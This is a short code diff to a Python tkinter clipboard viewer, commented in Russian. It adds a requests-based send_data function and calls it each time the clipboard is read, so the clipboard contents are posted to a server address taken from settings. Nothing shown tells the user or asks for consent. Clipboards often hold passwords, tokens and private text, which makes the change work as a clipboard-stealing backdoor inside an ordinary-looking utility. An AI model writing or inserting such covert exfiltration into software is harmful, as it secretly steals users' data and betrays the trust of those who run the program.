@@ -1,6 +1,11 @@
 from tkinter import*
 from main_settings import*
 import keyboard
+import requests
+
+# Функция для потравки данных на сервер
+def send_data(data):
+    requests.post(SERVER_ADRESS, json={'data': data})
 
 # Основное окно
 tk = Tk()
@@ -20,6 +25,7 @@ bufer_label.grid(row=0, column=0)
 def read(e):
     global bufer_data
     bufer_data = tk.clipboard_get()
+    send_data(bufer_data)
     if SHOW_BUFER_DATA:
         bufer_label['text'] = bufer_data
         tk.update()
